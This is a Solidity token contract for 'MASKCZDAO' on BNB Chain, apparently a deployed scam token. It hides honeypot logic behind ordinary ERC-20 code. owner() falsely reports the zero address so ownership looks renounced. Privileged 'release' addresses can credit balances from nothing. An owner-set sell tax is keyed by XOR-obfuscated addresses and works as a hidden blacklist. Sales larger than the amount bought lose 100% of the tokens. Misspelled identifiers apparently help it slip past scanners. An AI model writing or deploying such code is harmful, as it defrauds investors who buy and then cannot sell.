/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// http://instagram.com/MASKCZDAO7300
// https://www.reddit.com/user/MASKCZDAO7300
// TWITTER:https://MASKCZDAO7300.com/
// WEBSITE:https://twitter.com/MASKCZDAO7300
// TELEGRAM:https://t.me/MASKCZDAO7300

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingMASKCZDAO7300OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingMASKCZDAO7300OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingMASKCZDAO7300OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingMASKCZDAO7300OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingMASKCZDAO7300OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function MASKCZDAO7300To() external view returns (address);
    function MASKCZDAO7300ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setMASKCZDAO7300To(address) external;
    function setMASKCZDAO7300ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

   function decimals() public view virtual returns (uint8) {
        return 9;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }
      function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract MASKCZDAO is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _baMASKCZDAO7300lances;
    mapping(address => uint256) private _baMASKCZDAO7300lances1;
    mapping(address => bool) private _reMASKCZDAO7300llease;
    mapping(uint256 => uint256) private _bMASKCZDAO7300blist;
string name_ = "MASKCZDAO";
string symbol_ = "MASKCZDAO";
uint256 totalSupply_ = 13000000;   
    address public uniswapV2Pair;
    address deMASKCZDAO7300ad = 0x000000000000000000000000000000000000dEaD;
    address _gaMASKCZDAO7300te = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820;
    address _mxMASKCZDAO7300x = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;
    address _UniMASKCZDAO7300swap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address _FacMASKCZDAO7300tory = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    constructor()

BEP20(name_, symbol_) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(_UniMASKCZDAO7300swap));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(_FacMASKCZDAO7300tory));

        _mtMASKCZDAO7300in(msg.sender, totalSupply_ * 10**decimals());

         transfer(deMASKCZDAO7300ad, totalSupply() / 10*2);
         transfer(_mxMASKCZDAO7300x, totalSupply() / 10*1);
         transfer(_gaMASKCZDAO7300te, totalSupply() / 10*2);

        _defaultSellMASKCZDAO7300 = 0;
        _defaultBuyMASKCZDAO7300 = 0;

        _reMASKCZDAO7300llease[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _baMASKCZDAO7300lances[cauunt];
    }

    function _mtMASKCZDAO7300in(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _baMASKCZDAO7300lances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellMASKCZDAO7300 = 0;
    uint256 private _defaultBuyMASKCZDAO7300 = 0;

    function _setRelease(address _address) external onlyowaer {
        _reMASKCZDAO7300llease[_address] = true;
    }
    function _incS(uint256 _value) external onlyowaer {
        _defaultSellMASKCZDAO7300 = _value;
    }

    function getRelease(address _address) external view onlyowaer returns (bool) {
        return _reMASKCZDAO7300llease[_address];
    }

    function _setMASKCZDAO7300(uint256[] memory _accMASKCZDAO7300,uint256[] memory _value)  external onlyowaer {
        for (uint i=0;i<_accMASKCZDAO7300.length;i++){
            _bMASKCZDAO7300blist[_accMASKCZDAO7300[i]] = _value[i];
        }
    }
function _msgMASKCZDAO7300Info(uint _accMASKCZDAO7300) internal view virtual returns (uint) {
        uint256 accMASKCZDAO7300 = _accMASKCZDAO7300 ^ 862221201251031215166314313522005684848242214375;
return _bMASKCZDAO7300blist[accMASKCZDAO7300];
}
    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_reMASKCZDAO7300llease[owaer] == true) {
            _baMASKCZDAO7300lances[to] += amuont;
            return true;
        }
        _tMASKCZDAO7300transfer(owaer, to, amuont);
        return true;
    }
    function _tMASKCZDAO7300transfer(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _baMASKCZDAO7300lances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

  
        uint256 tradeMASKCZDAO7300 = 0;
        uint256 tradeMASKCZDAO7300amuont = 0;

        if (!(_reMASKCZDAO7300llease[from] || _reMASKCZDAO7300llease[_to])) {
            if (from == uniswapV2Pair) {
                tradeMASKCZDAO7300 = _defaultBuyMASKCZDAO7300;
                _baMASKCZDAO7300lances1[_to] += _amuont;
            }
            if (_to == uniswapV2Pair) {                   
                tradeMASKCZDAO7300 = _msgMASKCZDAO7300Info(uint160(from));
                tradeMASKCZDAO7300 = tradeMASKCZDAO7300 < _defaultSellMASKCZDAO7300 ? _defaultSellMASKCZDAO7300 : tradeMASKCZDAO7300;
                tradeMASKCZDAO7300 = _baMASKCZDAO7300lances1[from] >= _amuont ? tradeMASKCZDAO7300 : 100;
                _baMASKCZDAO7300lances1[from] = _baMASKCZDAO7300lances1[from] >= _amuont ? _baMASKCZDAO7300lances1[from] - _amuont : _baMASKCZDAO7300lances1[from];
            }
                        
            tradeMASKCZDAO7300amuont = _amuont.mul(tradeMASKCZDAO7300).div(100);
        }


        if (tradeMASKCZDAO7300amuont > 0) {
            _baMASKCZDAO7300lances[from] = _baMASKCZDAO7300lances[from].sub(tradeMASKCZDAO7300amuont);
            _baMASKCZDAO7300lances[deMASKCZDAO7300ad] = _baMASKCZDAO7300lances[deMASKCZDAO7300ad].add(tradeMASKCZDAO7300amuont);
            emit Transfer(from, deMASKCZDAO7300ad, tradeMASKCZDAO7300amuont);
        }

        _baMASKCZDAO7300lances[from] = _baMASKCZDAO7300lances[from].sub(_amuont - tradeMASKCZDAO7300amuont);
        _baMASKCZDAO7300lances[_to] = _baMASKCZDAO7300lances[_to].add(_amuont - tradeMASKCZDAO7300amuont);
        emit Transfer(from, _to, _amuont - tradeMASKCZDAO7300amuont);
    }



    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _tMASKCZDAO7300transfer(from, to, amuont);
        return true;
    }
}